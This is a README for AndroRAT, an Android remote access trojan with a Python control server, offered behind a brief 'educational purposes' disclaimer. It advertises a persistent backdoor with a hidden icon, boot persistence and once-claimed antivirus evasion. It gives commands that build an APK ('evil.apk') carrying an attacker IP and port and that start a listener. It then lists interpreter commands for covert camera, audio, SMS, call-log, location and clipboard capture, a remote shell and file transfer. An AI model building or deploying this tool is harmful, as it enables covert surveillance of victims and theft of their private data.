**Disclaimer** : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
# AndroRAT 

[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![GitHub followers](https://img.shields.io/github/followers/RivalTomia?label=Follow&style=social)](https://github.com/RivalTomia)

AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.

##### AndroRAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)

> AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 

## Screenshots

![AndroRAT](Screnshots/5.jpg "AndroRAT in action")
## Features of AndroRAT 
* Full persistent backdoor
* ~~Fully undetectable by any antivirus scanner [VirusTotal](https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection)~~
* Invisible icon on install
* Light weight apk which runs 24*7 in background
* App starts automatically on boot up 
* Can record audio, video, take picture from both camera
* Browse call logs and SMS logs
* Get current location, sim card details ,ip, mac address of the device


## Prerequisites
AndroRAT requires Python3 and JAVA (or Android Studio)

## Installation
```
git clone https://github.com/RivalTomia/AndroRAT.git
cd AndroRAT
pip install -r requirements.txt
```
#### Note: 
While cloning the repository using Git bash on Windows, you may get the following error:
> error: unable to create file \<filename>: Filename too long

This is because the Git has a limit of 4096 characters for a filename, except on Windows when Git is compiled with msys. It uses an older version of the Windows API and there's a limit of 260 characters for a filename. 

You can circumvent this by setting `core.longpaths` to `true`.

> git config --system core.longpaths true

You must run Git bash with administrator privileges. 

## Usage (Windows and Linux)

* To get the control panel of the app dial `*#*#1337#*#*` (For now it has only two options `Restart Activity` and `Uninstall`)
> Note: In order to use this feature in some devices you need to enable the option `display pop-up windows running in background` from the settings.

### Available Modes
* `--build` - for building the android apk 
* `--ngrok` - for using ngrok tunnel (over the internet)
* `--shell` - getting an interactive shell of the device

### `build` mode

```
Usage:
  python3 androRAT.py --build --ngrok [flags]
  Flags:
    -p, --port              Attacker port number (optional by default its set to 8000)
    -o, --output            Name for the apk file (optional by default its set to "Rivalt.apk")
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

```
Usage:
  python3 androRAT.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

Or you can manually build the apk by importing [Android Code](Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
### `shell` mode
```
Usage:
  python3 androRAT.py --shell [flags]
  Flags:
    -i, --ip                Listner IP address
    -p, --port              Listner port number
```
After running the `shell` mode you will get an interpreter of the device  

Commands which can run on the interpreter
```
    deviceInfo                 --> Mengambil info dasar device
    camList                    --> Mengambil cameraID  
    takepic [cameraID]         --> Mengambil gambar dari kamera
    startVideo [cameraID]      --> Mulai merekam video
    stopVideo                  --> Berhenti merekam video dan mengambil file video
    startAudio                 --> Mulai merekam audio
    stopAudio                  --> Berhenti merekam audio
    getSMS [inbox|sent]        --> Mengambil sms kotak masuk atau sms yang di kirim dalam sebuah file 
    getCallLogs                --> Mengambil log panggilan dalam sebuah file
    shell                      --> Memulai shell interaktif perangkat
    vibrate [number_of_times]  --> Menggetarkan perangkat beberapa kali
    getLocation                --> Mengambil Lokasi perangkat saat ini
    getIP                      --> Mengambil IP perangkat
    getSimDetails              --> Mengambil detail semua sim perangkat
    clear                      --> Membersihkan layar
    getClipData                --> Mengambil teks yang di simpan saat ini dari papan klip
    getMACAddress              --> Mengambil MAC Addresss dari perangkat
    exit                       --> Keluar
```
In the sh shell there are some sub commands
```
    get [full_file_path]        --> donwloads the file to the local machine (file size upto 15mb)
    put [filename]              --> uploads the file to the android device
```

## Examples

* To build the apk using ngrok which will also set the listner:
```python3 androRAT.py --build --ngrok -o evil.apk```

* To build the apk using desired ip and port:
```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```

* To get the interpreter:
```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```

## Interpreter Examples
* Generating APK
<p align="center">
  <img src="Screnshots/6.JPG" width="800"/>
</p>
------------------------------------------------------------------------------------------------------------------------------  

* Some interpreter Commands 
<p align="center">
  <img src="Screnshots/1.JPG" width="800"/>
</p>
------------------------------------------------------------------------------------------------------------------------------


## TODO
* Set up multi client
* Add screenshot command


## License
AndroRAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.


